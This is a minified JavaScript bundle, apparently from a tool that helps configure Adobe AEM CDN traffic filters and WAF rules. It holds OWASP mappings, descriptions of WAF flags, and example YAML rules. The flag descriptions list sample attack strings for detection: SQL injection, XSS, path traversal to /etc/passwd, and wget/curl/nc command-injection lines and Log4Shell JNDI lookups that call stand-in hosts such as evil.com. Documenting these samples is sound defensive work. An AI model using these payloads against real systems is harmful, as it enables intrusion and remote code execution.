n=Xe(e)?String(t):"",r="\n"===e[e.length-1];return n+(r&&("\n"===e[e.length-2]||"\n"===e)?"+":r?"":"-")+"\n"}function tt(e){return"\n"===e[e.length-1]?e.slice(0,-1):e}function nt(e,t){if(""===e||" "===e[0])return e;for(var n,r,a=/ [^ ]/g,i=0,s=0,o=0,l="";n=a.exec(e);)(o=n.index)-i>t&&(r=s>i?s:o,l+="\n"+e.slice(i,r),i=r+1),s=o;return l+="\n",e.length-i>t&&s>i?l+=e.slice(i,s)+"\n"+e.slice(s+1):l+=e.slice(i),l.slice(1)}function rt(e,t,n,r){var a,i,s,o="",l=e.tag;for(a=0,i=n.length;a<i;a+=1)s=n[a],e.replacer&&(s=e.replacer.call(n,String(a),s)),(it(e,t+1,s,!0,!0,!1,!0)||"undefined"===typeof s&&it(e,t+1,null,!0,!0,!1,!0))&&(r&&""===o||(o+=Ve(e,t)),e.dump&&10===e.dump.charCodeAt(0)?o+="-":o+="- ",o+=e.dump);e.tag=l,e.dump=o||"[]"}function at(e,t,n){var r,a,i,s,o,l;for(i=0,s=(a=n?e.explicitTypes:e.implicitTypes).length;i<s;i+=1)if(((o=a[i]).instanceOf||o.predicate)&&(!o.instanceOf||"object"===typeof t&&t instanceof o.instanceOf)&&(!o.predicate||o.predicate(t))){if(n?o.multi&&o.representName?e.tag=o.representName(t):e.tag=o.tag:e.tag="?",o.represent){if(l=e.styleMap[o.tag]||o.defaultStyle,"[object Function]"===Ie.call(o.represent))r=o.represent(t,l);else{if(!Me.call(o.represent,l))throw new p("!<"+o.tag+'> tag resolver accepts not "'+l+'" style');r=o.represent[l](t,l)}e.dump=r}return!0}return!1}function it(e,t,n,r,a,i,s){e.tag=null,e.dump=n,at(e,n,!1)||at(e,n,!0);var o,l=Ie.call(e.dump),c=r;r&&(r=e.flowLevel<0||e.flowLevel>t);var u,d,h="[object Object]"===l||"[object Array]"===l;if(h&&(d=-1!==(u=e.duplicates.indexOf(n))),(null!==e.tag&&"?"!==e.tag||d||2!==e.indent&&t>0)&&(a=!1),d&&e.usedDuplicates[u])e.dump="*ref_"+u;else{if(h&&d&&!e.usedDuplicates[u]&&(e.usedDuplicates[u]=!0),"[object Object]"===l)r&&0!==Object.keys(e.dump).length?(!function(e,t,n,r){var a,i,s,o,l,c,u="",d=e.tag,h=Object.keys(n);if(!0===e.sortKeys)h.sort();else if("function"===typeof e.sortKeys)h.sort(e.sortKeys);else if(e.sortKeys)throw new p("sortKeys must be a boolean or a function");for(a=0,i=h.length;a<i;a+=1)c="",r&&""===u||(c+=Ve(e,t)),o=n[s=h[a]],e.replacer&&(o=e.replacer.call(n,s,o)),it(e,t+1,s,!0,!0,!0)&&((l=null!==e.tag&&"?"!==e.tag||e.dump&&e.dump.length>1024)&&(e.dump&&10===e.dump.charCodeAt(0)?c+="?":c+="? "),c+=e.dump,l&&(c+=Ve(e,t)),it(e,t+1,o,!0,l)&&(e.dump&&10===e.dump.charCodeAt(0)?c+=":":c+=": ",u+=c+=e.dump));e.tag=d,e.dump=u||"{}"}(e,t,e.dump,a),d&&(e.dump="&ref_"+u+e.dump)):(!function(e,t,n){var r,a,i,s,o,l="",c=e.tag,u=Object.keys(n);for(r=0,a=u.length;r<a;r+=1)o="",""!==l&&(o+=", "),e.condenseFlow&&(o+='"'),s=n[i=u[r]],e.replacer&&(s=e.replacer.call(n,i,s)),it(e,t,i,!1,!1)&&(e.dump.length>1024&&(o+="? "),o+=e.dump+(e.condenseFlow?'"':"")+":"+(e.condenseFlow?"":" "),it(e,t,s,!1,!1)&&(l+=o+=e.dump));e.tag=c,e.dump="{"+l+"}"}(e,t,e.dump),d&&(e.dump="&ref_"+u+" "+e.dump));else if("[object Array]"===l)r&&0!==e.dump.length?(e.noArrayIndent&&!s&&t>0?rt(e,t-1,e.dump,a):rt(e,t,e.dump,a),d&&(e.dump="&ref_"+u+e.dump)):(!function(e,t,n){var r,a,i,s="",o=e.tag;for(r=0,a=n.length;r<a;r+=1)i=n[r],e.replacer&&(i=e.replacer.call(n,String(r),i)),(it(e,t,i,!1,!1)||"undefined"===typeof i&&it(e,t,null,!1,!1))&&(""!==s&&(s+=","+(e.condenseFlow?"":" ")),s+=e.dump);e.tag=o,e.dump="["+s+"]"}(e,t,e.dump),d&&(e.dump="&ref_"+u+" "+e.dump));else{if("[object String]"!==l){if("[object Undefined]"===l)return!1;if(e.skipInvalid)return!1;throw new p("unacceptable kind of an object to dump "+l)}"?"!==e.tag&&Ze(e,e.dump,t,i,c)}null!==e.tag&&"?"!==e.tag&&(o=encodeURI("!"===e.tag[0]?e.tag.slice(1):e.tag).replace(/!/g,"%21"),o="!"===e.tag[0]?"!"+o:"tag:yaml.org,2002:"===o.slice(0,18)?"!!"+o.slice(18):"!<"+o+">",e.dump=o+" "+e.dump)}return!0}function st(e,t){var n,r,a=[],i=[];for(ot(e,a,i),n=0,r=i.length;n<r;n+=1)t.duplicates.push(a[i[n]]);t.usedDuplicates=new Array(r)}function ot(e,t,n){var r,a,i;if(null!==e&&"object"===typeof e)if(-1!==(a=t.indexOf(e)))-1===n.indexOf(a)&&n.push(a);else if(t.push(e),Array.isArray(e))for(a=0,i=e.length;a<i;a+=1)ot(e[a],t,n);else for(a=0,i=(r=Object.keys(e)).length;a<i;a+=1)ot(e[r[a]],t,n)}function lt(e,t){return function(){throw new Error("Function yaml."+e+" is removed in js-yaml 4. Use yaml."+t+" instead, which is now safe by default.")}}var ct={Type:v,Schema:w,FAILSAFE_SCHEMA:S,JSON_SCHEMA:F,CORE_SCHEMA:I,DEFAULT_SCHEMA:Y,load:Fe.load,loadAll:Fe.loadAll,dump:{dump:function(e,t){var n=new He(t=t||{});n.noRefs||st(e,n);var r=e;return n.replacer&&(r=n.replacer.call({"":r},"",r)),it(n,0,r,!0,!0)?n.dump+"\n":""}}.dump,YAMLException:p,types:{binary:W,float:O,map:N,null:C,pairs:G,set:K,timestamp:_,bool:A,int:E,merge:B,omap:V,seq:j,str:k},safeLoad:lt("safeLoad","load"),safeLoadAll:lt("safeLoadAll","loadAll"),safeDump:lt("safeDump","dump")};const ut={standard:{name:"Standard Traffic Filter Rules",description:"Prevent abuse such as DoS, DDoS, scraping, or bot activity. Included with Sites and Forms licenses.",license:"Sites/Forms (included)",useCases:["Rate limiting IPs making excessive requests","Geo-blocking specific countries","User-agent filtering for bots","Blocking specific paths or patterns"],recommendedMode:"Start with LOG mode, then move to BLOCK mode after validation",examples:["Rate limiting","Geo-blocking","IP blocking","Path blocking"]},waf:{name:"WAF Traffic Filter Rules",description:"Detect and react to sophisticated attack patterns (OWASP Top 10). Provides proactive protection with advanced intelligence to limit false positives.",license:"Extended Security (WAF-DDoS Protection) or Enhanced Security",useCases:["SQL injection protection","Cross-site scripting (XSS) prevention","Known attack IP blocking","OWASP Top 10 threat protection"],recommendedMode:"BLOCK mode for ATTACK-FROM-BAD-IP, LOG mode for ATTACK (then switch to BLOCK)",examples:["SQLI detection","XSS prevention","Log4Shell protection","Backdoor detection"]}},dt={"A01:2021":{name:"Broken Access Control",description:"Access control enforces policy such that users cannot act outside of their intended permissions.",wafFlags:["TRAVERSAL","PRIVATEFILE"],mitigations:["Path-based blocking","Private file access prevention"]},"A02:2021":{name:"Cryptographic Failures",description:"Failures related to cryptography which often leads to sensitive data exposure.",wafFlags:[],mitigations:["HTTPS enforcement","Secure headers"]},"A03:2021":{name:"Injection",description:"User-supplied data is not validated, filtered, or sanitized by the application.",wafFlags:["SQLI","XSS","CMDEXE","CMDEXE-NO-BIN","LOG4J-JNDI","NULLBYTE"],mitigations:["SQL Injection detection","XSS prevention","Command injection blocking"]},"A04:2021":{name:"Insecure Design",description:"Missing or ineffective control design.",wafFlags:[],mitigations:["Rate limiting","Input validation"]},"A05:2021":{name:"Security Misconfiguration",description:"Missing appropriate security hardening across any part of the application stack.",wafFlags:["PRIVATEFILE","BACKDOOR"],mitigations:["Private file blocking","Backdoor detection"]},"A06:2021":{name:"Vulnerable and Outdated Components",description:"Using components with known vulnerabilities.",wafFlags:["LOG4J-JNDI","SANS"],mitigations:["Log4Shell protection","Known vulnerability pattern detection"]},"A07:2021":{name:"Identification and Authentication Failures",description:"Authentication and session management weaknesses.",wafFlags:["NOUA","USERAGENT"],mitigations:["Bot detection","User-agent validation"]},"A08:2021":{name:"Software and Data Integrity Failures",description:"Code and infrastructure that does not protect against integrity violations.",wafFlags:["BACKDOOR"],mitigations:["Backdoor/webshell detection"]},"A09:2021":{name:"Security Logging and Monitoring Failures",description:"Without logging and monitoring, breaches cannot be detected.",wafFlags:[],mitigations:["Enable alert notifications","Use LOG mode for analysis"]},"A10:2021":{name:"Server-Side Request Forgery (SSRF)",description:"SSRF flaws occur when fetching a remote resource without validating the user-supplied URL.",wafFlags:["ATTACK"],mitigations:["General attack pattern detection"]}},pt={"ATTACK-FROM-BAD-IP":{name:"ATTACK-FROM-BAD-IP",category:"Threat Intelligence",severity:"critical",description:"Attack from known malicious IP - Blocks attacks that BOTH match suspicious patterns AND originate from IPs with malicious history. Safe to use in BLOCK mode immediately due to very low false positive rate.",examples:["Known botnet IP addresses","Previously flagged attack sources","Malicious hosting providers","Compromised server IPs"],attackType:"Known Malicious Source + Attack Pattern",mitigates:"Blocks traffic from IPs with established malicious reputation combined with attack patterns",license:"Extended Security",recommended:!0,recommendedAction:"block",deploymentNote:"Safe to deploy in BLOCK mode immediately. This flag has inherent dual validation (attack pattern + bad IP) minimizing false positives.",owaspMapping:["A03:2021","A10:2021"]},ATTACK:{name:"ATTACK",category:"General",severity:"high",description:"General attack pattern detection - Catches various attack signatures from any IP. Adobe experience indicates false positives are rare, but recommend starting in LOG mode.",examples:["Multiple combined attack vectors","Novel attack patterns","Obfuscated attack attempts","General suspicious behavior"],attackType:"General Attack Patterns",mitigates:"Broad protection against various attack techniques",license:"Extended Security",recommended:!0,recommendedAction:"log",deploymentNote:"Start in LOG mode. Analyze CDN logs to verify no legitimate traffic is flagged. Switch to BLOCK after validation.",owaspMapping:["A03:2021","A10:2021"]},SQLI:{name:"SQLI",category:"Injection",severity:"critical",description:"SQL Injection detection - Blocks requests containing SQL injection attack patterns targeting database queries.",examples:["' OR '1'='1","1; DROP TABLE users--","UNION SELECT * FROM passwords","'; DELETE FROM users WHERE '1'='1"],attackType:"SQL Injection",mitigates:"Prevents attackers from manipulating database queries to access or modify unauthorized data",license:"Extended Security",owaspMapping:["A03:2021"]},XSS:{name:"XSS",category:"Injection",severity:"high",description:"Cross-Site Scripting detection - Blocks requests containing XSS attack patterns that could inject malicious scripts.",examples:["<script>alert('XSS')<\/script>","<img src=x onerror=alert('XSS')>","javascript:alert('XSS')","<svg onload=alert('XSS')>"],attackType:"Cross-Site Scripting",mitigates:"Prevents injection of malicious scripts that could steal user data or hijack sessions",license:"Extended Security",owaspMapping:["A03:2021"]},TRAVERSAL:{name:"TRAVERSAL",category:"Path Manipulation",severity:"high",description:"Directory/Path Traversal detection - Blocks requests attempting to access files outside the intended web root directory.",examples:["../../../etc/passwd","..\\..\\windows\\system32","%2e%2e%2f%2e%2e%2f","....//....//etc/passwd"],attackType:"Path Traversal",mitigates:"Prevents unauthorized access to system files and sensitive configuration data",license:"Extended Security",owaspMapping:["A01:2021","A03:2021"]},CMDEXE:{name:"CMDEXE",category:"Command Execution",severity:"critical",description:"Command Execution detection - Blocks requests containing OS command injection patterns that could execute system commands.",examples:["; ls -la","| cat /etc/passwd","`whoami`","$(wget http://malicious.com/shell.sh)"],attackType:"Command Injection",mitigates:"Prevents execution of arbitrary system commands on the server",license:"Extended Security",owaspMapping:["A03:2021"]},"CMDEXE-NO-BIN":{name:"CMDEXE-NO-BIN",category:"Command Execution",severity:"high",description:"Command Execution detection excluding binary paths - More targeted command injection detection with fewer false positives than CMDEXE.",examples:["; rm -rf /","| nc -e /bin/sh","&& curl malicious.com","|| wget evil.com/backdoor"],attackType:"Command Injection (No Binary)",mitigates:"Targeted protection against command injection without binary path patterns",license:"Extended Security",owaspMapping:["A03:2021"]},"LOG4J-JNDI":{name:"LOG4J-JNDI",category:"Remote Code Execution",severity:"critical",description:"Log4j JNDI Injection detection (CVE-2021-44228) - Blocks Log4Shell exploit attempts that can lead to remote code execution.",examples:["${jndi:ldap://evil.com/a}","${jndi:rmi://attacker.com/obj}","${${lower:j}ndi:ldap://x.x.x.x/a}","${jndi:dns://callback.evil.com}"],attackType:"Log4Shell / JNDI Injection",mitigates:"Prevents exploitation of the critical Log4j vulnerability for remote code execution",license:"Extended Security",owaspMapping:["A03:2021","A06:2021"]},BACKDOOR:{name:"BACKDOOR",category:"Malware",severity:"critical",description:"Backdoor detection - Blocks requests matching known backdoor signatures, webshell patterns, and malicious file access attempts.",examples:["c99shell","r57shell","WSO webshell access","FilesMan backdoor"],attackType:"Backdoor/Webshell",mitigates:"Prevents access to or deployment of malicious backdoor scripts",license:"Extended Security",owaspMapping:["A05:2021","A08:2021"]},USERAGENT:{name:"USERAGENT",category:"Bot Detection",severity:"medium",description:"Malicious User-Agent detection - Blocks requests from known malicious tools, vulnerability scanners, and attack frameworks.",examples:["sqlmap/1.0","Nikto","masscan","ZmEu"],attackType:"Malicious Bot/Scanner",mitigates:"Blocks automated attack tools and vulnerability scanners",license:"Extended Security",owaspMapping:["A07:2021"]},SANS:{name:"SANS",category:"Threat Intelligence",severity:"high",description:"SANS Top Attack patterns - Blocks requests matching SANS-identified common attack vectors based on global threat intelligence.",examples:["Common exploit patterns","Known CVE exploitation attempts","Frequent attack signatures","Top vulnerability exploits"],attackType:"Common Attack Patterns",mitigates:"Protection against most common attack vectors identified by SANS",license:"Extended Security",owaspMapping:["A06:2021"]},TORNODE:{name:"TORNODE",category:"Anonymization",severity:"medium",description:"Tor Exit Node detection - Blocks requests originating from known Tor exit nodes, commonly used to anonymize malicious activity.",examples:["Traffic from Tor network","Anonymous proxy requests","Dark web originated traffic"],attackType:"Tor Network Traffic",mitigates:"Blocks anonymized traffic commonly used to hide malicious activity",license:"Extended Security"},NOUA:{name:"NOUA",category:"Bot Detection",severity:"low",description:"No User-Agent detection - Blocks requests without a User-Agent header, which typically indicates automated/bot traffic.",examples:["curl without -A flag","wget default requests","Custom scripts without UA","Empty User-Agent header"],attackType:"Missing User-Agent",mitigates:"Blocks automated requests that lack proper browser identification",license:"Extended Security",owaspMapping:["A07:2021"]},SCANNER:{name:"SCANNER",category:"Bot Detection",severity:"medium",description:"Security Scanner detection - Blocks requests from vulnerability scanners and automated security testing tools.",examples:["Nessus scans","Acunetix requests","OWASP ZAP traffic","Burp Suite scans"],attackType:"Vulnerability Scanner",mitigates:"Prevents automated security scanning and reconnaissance",license:"Extended Security"},PRIVATEFILE:{name:"PRIVATEFILE",category:"Data Protection",severity:"high",description:"Private File access detection - Blocks access to sensitive configuration files, hidden files, and system files.",examples:[".htaccess",".git/config","wp-config.php",".env files"],attackType:"Sensitive File Access",mitigates:"Prevents exposure of configuration files and sensitive data",license:"Extended Security",owaspMapping:["A01:2021","A05:2021"]},NULLBYTE:{name:"NULLBYTE",category:"Evasion",severity:"high",description:"Null Byte Injection detection - Blocks requests containing null byte injection attempts used to bypass file extension filters.",examples:["file.php%00.jpg","document.txt\\0.exe","%00 bypass attempts","Null character injection"],attackType:"Null Byte Injection",mitigates:"Prevents file extension bypass and filter evasion attacks",license:"Extended Security",owaspMapping:["A03:2021"]}},ht={critical:{bg:"rgba(227, 72, 80, 0.15)",color:"#ec5b62"},high:{bg:"rgba(230, 134, 25, 0.15)",color:"#f29423"},medium:{bg:"rgba(38, 128, 235, 0.15)",color:"#378ef0"},low:{bg:"rgba(45, 157, 120, 0.15)",color:"#33ab84"}},ft={name:{required:!0,type:"string",maxLength:64,description:"Rule name - must be unique and max 64 characters. Can only contain alphanumerics and dashes.",example:"block-sql-injection"},when:{required:!0,type:"object",description:"Condition that determines when the rule should be evaluated. Can contain nested conditions using allOf/anyOf.",properties:{reqProperty:{type:"string",description:"Request property to match against",values:["path","queryString","method","tier","domain","clientIp","clientCountry","clientAsn","userAgent"]},reqHeader:{type:"string",description:"Request header to match against (e.g., Host, User-Agent, X-Forwarded-For)"},queryParam:{type:"string",description:"Query parameter name to match against"},allOf:{type:"array",description:"ALL conditions must match (AND logic)"},anyOf:{type:"array",description:"ANY condition must match (OR logic)"}}},action:{required:!0,type:"string|object",description:'Action to take when rule matches. Can be simple string ("block", "log", "allow") or object with type and wafFlags.',values:["block","log","allow"],properties:{type:{type:"string",values:["block","log","allow"],description:"Action type"},wafFlags:{type:"array",description:"WAF flags to enable (requires Extended Security license)",requiresLicense:!0}}},rateLimit:{required:!1,type:"object",description:"Rate limiting configuration",properties:{limit:{type:"number",description:"Maximum number of requests allowed in the time window"},window:{type:"number",description:"Time window in seconds (1-120)"},count:{type:"string",values:["all","fetches","errors"],description:"What to count - all requests, only origin fetches, or errors",default:"all"},penalty:{type:"number",description:"How long (in seconds) to block the client after exceeding the limit"},groupBy:{type:"array",description:"Properties to group rate limiting by (e.g., clientIp, clientAsn)",values:["clientIp","clientAsn","clientCountry"]}}},alert:{required:!1,type:"boolean",description:"Whether to send alert notifications when this rule triggers",default:!1}},mt={equals:{description:"Exact string match",example:'{ reqProperty: path, equals: "/admin" }',useCase:"Block exact path"},notEquals:{description:"Does not equal",example:'{ reqProperty: tier, notEquals: "author" }',useCase:"Apply to all tiers except author"},like:{description:"Wildcard pattern match using * for any characters",example:'{ reqProperty: path, like: "/api/*" }',useCase:"Match paths starting with /api/"},notLike:{description:"Does not match wildcard pattern",example:'{ reqProperty: path, notLike: "*.html" }',useCase:"Exclude HTML files"},matches:{description:"Regular expression match (Java regex syntax)",example:'{ reqProperty: path, matches: "^/content/.*\\.json$" }',useCase:"Match complex patterns"},in:{description:"Value is in provided list",example:'{ reqProperty: clientCountry, in: ["US", "CA", "GB"] }',useCase:"Allow specific countries"},notIn:{description:"Value is not in provided list",example:'{ reqProperty: method, notIn: ["GET", "HEAD"] }',useCase:"Block non-read methods"}},gt={path:{description:"The request URI path without query string",example:"/content/dam/image.jpg"},queryString:{description:"The query string portion of the URL",example:"?id=123&sort=asc"},method:{description:"HTTP method (GET, POST, PUT, DELETE, etc.)",example:"GET"},tier:{description:'AEM tier - "author" or "publish"',example:"publish"},domain:{description:"The request domain/hostname",example:"www.example.com"},clientIp:{description:"The client IP address",example:"192.168.1.100"},clientCountry:{description:"Two-letter ISO 3166-1 alpha-2 country code",example:"US"},clientAsn:{description:"Autonomous System Number of the client network",example:"15169 (Google)"},userAgent:{description:"The User-Agent header value",example:"Mozilla/5.0..."}},yt=[{value:"block",label:"Block",description:"Immediately block the request with 403 Forbidden response",color:"red"},{value:"log",label:"Log",description:"Log the request for analysis but allow it to pass through. Recommended for initial deployment.",color:"blue"},{value:"allow",label:"Allow",description:"Explicitly allow the request, bypassing subsequent rules",color:"green"}],vt=[{value:"all",label:"All Requests",description:"Count all requests including cached (CDN edge)",targetLayer:"CDN Edge"},{value:"fetches",label:"Origin Fetches",description:"Only count requests that go to origin (cache misses)",targetLayer:"Origin"},{value:"errors",label:"Errors Only",description:"Only count error responses (4xx, 5xx)",targetLayer:"Any"}],xt=[{code:"SY",name:"Syria"},{code:"BY",name:"Belarus"},{code:"MM",name:"Myanmar"},{code:"KP",name:"North Korea"},{code:"IQ",name:"Iraq"},{code:"CD",name:"Congo (DRC)"},{code:"SD",name:"Sudan"},{code:"IR",name:"Iran"},{code:"LR",name:"Liberia"},{code:"ZW",name:"Zimbabwe"},{code:"CU",name:"Cuba"},{code:"CI",name:"C\xf4te d'Ivoire"}],bt={steps:[{step:1,title:"Define Rules in YAML",description:"Create cdn.yaml with traffic filter rules in your config folder",action:"Create/edit cdn.yaml file"},{step:2,title:"Deploy via Cloud Manager",description:"Use Cloud Manager config pipeline to deploy rules",action:"Run config pipeline"},{step:3,title:"Start in LOG Mode",description:"Deploy rules with action: log to observe matches without blocking",action:"Monitor CDN logs"},{step:4,title:"Analyze Results",description:"Use Adobe dashboard tooling to analyze CDN logs for matches and false positives",action:"Review matches"},{step:5,title:"Switch to BLOCK Mode",description:"After validation, change action: log to action: block",action:"Update and redeploy"},{step:6,title:"Enable Alerts",description:"Add alert: true to get notified when rules trigger",action:"Configure alerts"}],exceptions:[{flag:"ATTACK-FROM-BAD-IP",note:"Safe to deploy in BLOCK mode immediately due to dual validation (attack pattern + malicious IP)"}]},wt=[{id:"monitor-sensitive",title:"Monitoring Sensitive Requests",description:"Log requests to sensitive endpoints for security analysis without blocking legitimate users.",category:"Monitoring",yaml:"- name: log-admin-access\n  when:\n    allOf:\n      - { reqProperty: tier, equals: 'publish' }\n      - { reqProperty: path, like: '/admin/*' }\n  action: log\n  alert: true",explanation:"Logs all requests to /admin/* paths on publish tier. Useful for detecting potential unauthorized access attempts.",useCase:"Security auditing, intrusion detection"},{id:"restrict-access",title:"Restricting Access by IP/Region",description:"Block or allow access based on client IP address or geographic location.",category:"Access Control",yaml:'- name: allow-office-ips\n  when:\n    allOf:\n      - { reqProperty: tier, equals: \'author\' }\n      - { reqProperty: clientIp, in: ["10.0.0.0/8", "192.168.0.0/16"] }\n  action: allow',explanation:"Explicitly allows internal IP ranges to access author tier. Allow rules are processed before block rules.",useCase:"IP whitelisting, internal access control"},{id:"block-methods",title:"Blocking HTTP Methods",description:"Restrict write methods on publish tier for read-only content delivery.",category:"Method Restriction",yaml:'- name: block-write-methods\n  when:\n    allOf:\n      - { reqProperty: tier, equals: \'publish\' }\n      - { reqProperty: method, notIn: ["GET", "HEAD", "OPTIONS"] }\n  action: block',explanation:"Blocks POST, PUT, DELETE methods on publish tier. Publish should typically only serve content.",useCase:"Read-only content delivery, prevent data modification"},{id:"rate-limit-api",title:"API Rate Limiting",description:"Protect API endpoints from abuse with per-client rate limits.",category:"Rate Limiting",yaml:"- name: rate-limit-api\n  when:\n    allOf:\n      - { reqProperty: tier, equals: 'publish' }\n      - { reqProperty: path, like: '/api/*' }\n  rateLimit:\n    limit: 50\n    window: 10\n    count: all\n    penalty: 60\n    groupBy:\n      - reqProperty: clientIp\n  action: log\n  alert: true",explanation:"Limits API calls to 50 requests per 10 seconds per IP. Violators are blocked for 60 seconds.",useCase:"API protection, prevent abuse, fair usage"},{id:"block-scanners",title:"Blocking Vulnerability Scanners",description:"Block known security scanning tools and automated reconnaissance.",category:"Bot Protection",yaml:'- name: block-scanners\n  when:\n    reqProperty: tier\n    in: ["author", "publish"]\n  action:\n    type: block\n    wafFlags:\n      - SCANNER\n      - USERAGENT\n      - NOUA',explanation:"Combines multiple bot detection flags to block automated scanning tools.",useCase:"Prevent reconnaissance, reduce attack surface"},{id:"protect-dam",title:"Protecting DAM Assets",description:"Block enumeration of Digital Asset Management paths.",category:"Path Protection",yaml:"- name: block-dam-enumeration\n  when:\n    allOf:\n      - { reqProperty: tier, equals: 'publish' }\n      - { reqProperty: path, matches: \"^/content/dam\\..*\\.json$\" }\n  action: block",explanation:"Blocks requests trying to enumerate DAM content via JSON selectors. Uses regex for precise matching.",useCase:"Prevent content enumeration, data exposure"}],kt=[{name:"block-path",category:"Path Blocking",yaml:"- name: block-path\n  when:\n    allOf:\n      - { reqProperty: tier, matches: \"author|publish\" }\n      - { reqProperty: path, equals: '/block/me' }\n  action: block",explanation:"Blocks access to a specific path on both author and publish tiers. Uses allOf to combine conditions with AND logic."},{name:"Enable-SQL-Injection-and-XSS-waf-rules-globally",category:"WAF Protection",yaml:'- name: Enable-SQL-Injection-and-XSS-waf-rules-globally\n  when: { reqProperty: path, like: "*" }\n  action:\n    type: block\n    wafFlags: [ SQLI, XSS ]',explanation:"Enables SQL Injection and XSS detection for all paths using wildcard. Requires Extended Security license."},{name:"block-specific-ips",category:"IP Blocking",yaml:'- name: block-specific-ips\n  when:\n    reqProperty: clientIp\n    in: ["203.0.113.45", "198.51.100.23"]\n  action: block',explanation:"Blocks specific IP addresses. Useful for blocking known attackers identified from log analysis."},{name:"allow-specific-ips",category:"IP Allowlist",yaml:'- name: allow-specific-ips\n  when:\n    reqProperty: clientIp\n    in: ["10.0.0.0/8", "192.168.0.0/16"]\n  action: allow',explanation:"Explicitly allows internal IP ranges to bypass other rules. Allow rules are processed before block rules."},{name:"block-by-user-agent",category:"User Agent Filtering",yaml:'- name: block-by-user-agent\n  when:\n    reqProperty: userAgent\n    like: "*curl*"\n  action: block',explanation:"Blocks requests with specific user agent patterns. Useful for blocking automated tools."},{name:"block-non-get-methods",category:"Method Restriction",yaml:'- name: block-non-get-methods\n  when:\n    allOf:\n      - { reqProperty: tier, equals: publish }\n      - { reqProperty: method, notIn: ["GET", "HEAD", "OPTIONS"] }\n  action: block',explanation:"Blocks write methods (POST, PUT, DELETE) on publish tier. Useful for read-only content delivery."},{name:"rate-limit-api",category:"Rate Limiting",yaml:'- name: rate-limit-api\n  when:\n    allOf:\n      - { reqProperty: tier, equals: publish }\n      - { reqProperty: path, like: "/api/*" }\n  rateLimit:\n    limit: 50\n    window: 10\n    count: all\n    penalty: 60\n    groupBy:\n      - reqProperty: clientIp\n  action: log',explanation:"Rate limits API endpoints to 50 requests per 10 seconds per IP. Clients exceeding this are blocked for 60 seconds."},{name:"block-specific-paths-regex",category:"Path Blocking (Regex)",yaml:'- name: block-specific-paths-regex\n  when:\n    reqProperty: path\n    matches: "^/content/dam/.*\\.(json|xml)$"\n  action: block',explanation:"Uses regex to block JSON and XML files under /content/dam/. Note the escaped backslash for regex syntax."}],jt={trafficFilterActions:["allow","block","log"],trafficFilterActionTypes:["block","log","allow"],requestTransformActions:["set","unset","transform"],responseTransformActions:["set","unset"],redirectActionTypes:["redirect"],originSelectorActionTypes:["selectOrigin","selectAemOrigin"],authenticationActions:["authenticate"],allActionTypes:["allow","block","log","set","unset","transform","redirect","selectOrigin","selectAemOrigin","authenticate"],transformOperations:["replace","tolower","toupper"],operators:["equals","notEquals","like","notLike","matches","doesNotMatch","in","notIn","exists","doesNotExist"],requestProperties:["path","url","queryString","method","tier","domain","clientIp","clientCountry","clientAsn","clientRegion","userAgent","referer","protocol","clientIp/8","clientIp/16","clientIp/24"],headerTargets:["reqHeader","respHeader"],cookieTargets:["reqCookie","respCookie"],queryTargets:["queryParam","queryParamValue","queryParamMatch","queryParamDoesNotMatch"],responseProperties:["respProperty","respHeader","respCookie"],specialTargets:["var","logProperty"],tiers:["author","publish"],methods:["GET","POST","PUT","DELETE","PATCH","HEAD","OPTIONS","CONNECT","TRACE"],rateCountTypes:["all","fetches","errors"],rateLimitGroupByProps:["clientIp","clientIp/8","clientIp/16","clientIp/24","clientCountry","clientAsn","path","domain"],wafFlags:Object.keys(pt),kindTypes:["CDN","MaintenanceTasks","LogForwarding","API"],redirectStatuses:[301,302,303,307,308],originProperties:["domain","timeout","forwardHost","forwardAuthorization","forwardCookie","headers","name"],aemOriginNames:["static","aem"],configSections:["trafficFilters","requestTransformations","responseTransformations","redirects","originSelectors","origins","errorPages","cdn"],rateLimitProperties:["limit","window","count","penalty","groupBy"],topLevelProperties:["kind","version","metadata","data"],metadataProperties:["envTypes","envType"],envTypes:["dev","stage","prod"],ruleProperties:["name","when","action","actions","rateLimit","alert"],conditionProperties:["reqProperty","reqHeader","reqCookie","queryParam","queryParamValue","allOf","anyOf","equals","notEquals","like","notLike","matches","doesNotMatch","in","notIn","exists","doesNotExist"],actionObjectProperties:["type","wafFlags","status","location","transform","originName","value"],transformProperties:["type","op","match","replacement","value","reqProperty","reqHeader","reqCookie","queryParam","respProperty","respHeader","respCookie","var","logProperty"],redirectProperties:["type","status","location","transform"],originSelectorProperties:["type","originName"],allValidProperties:["kind","version","metadata","data","envTypes","envType","trafficFilters","requestTransformations","responseTransformations","redirects","originSelectors","origins","rules","errorPages","cdn","name","when","action","actions","rateLimit","alert","reqProperty","reqHeader","reqCookie","queryParam","queryParamValue","allOf","anyOf","equals","notEquals","like","notLike","matches","doesNotMatch","in","notIn","exists","doesNotExist","limit","window","count","penalty","groupBy","type","wafFlags","status","location","transform","originName","op","match","replacement","value","respProperty","respHeader","respCookie","var","logProperty","domain","timeout","forwardHost","forwardAuthorization","forwardCookie","headers","removeMarketingParams"],booleanProperties:["removeMarketingParams","forwardHost","forwardAuthorization","forwardCookie","exists"],transformActionProperties:["type","op","match","replacement","value","reqProperty","reqHeader","reqCookie","queryParam","respProperty","respHeader","respCookie","var","logProperty","status","location","transform","originName"],ruleDefinitionProperties:["name","when","action","actions","rateLimit","alert","limit","window","count","penalty","groupBy","wafFlags","allOf","anyOf","type","status","location","transform","op","match","replacement","value","originName"]},Nt=()=>{const[e,t]=(0,r.useState)(""),[n,a]=(0,r.useState)([]),[s,o]=(0,r.useState)(!1),[l,c]=(0,r.useState)(""),[u,d]=(0,r.useState)("all"),[p,h]=(0,r.useState)(!1),[f,m]=(0,r.useState)(!1),[g,y]=(0,r.useState)(null),[v,x]=(0,r.useState)(null),[b,w]=(0,r.useState)(null),[k,j]=(0,r.useState)("analysis"),[N,S]=(0,r.useState)(null),C=(e,t)=>{const n=e.split("\n").slice(0,t);let r="unknown",a=!1;for(let i=n.length-1;i>=0;i--){const e=n[i].trim();if(("actions:"===e||e.startsWith("actions:"))&&(a=!0),e.startsWith("trafficFilters:")){r="trafficFilters";break}if(e.startsWith("requestTransformations:")){r="requestTransformations";break}if(e.startsWith("responseTransformations:")){r="responseTransformations";break}if(e.startsWith("redirects:")){r="redirects";break}if(e.startsWith("originSelectors:")){r="originSelectors";break}if(e.startsWith("origins:")){r="origins";break}}return r},A=e=>{switch(e){case"trafficFilters":return[...jt.trafficFilterActions,...jt.authenticationActions];case"requestTransformations":return jt.requestTransformActions;case"responseTransformations":return jt.responseTransformActions;case"redirects":return jt.redirectActionTypes;case"originSelectors":return jt.originSelectorActionTypes;default:return 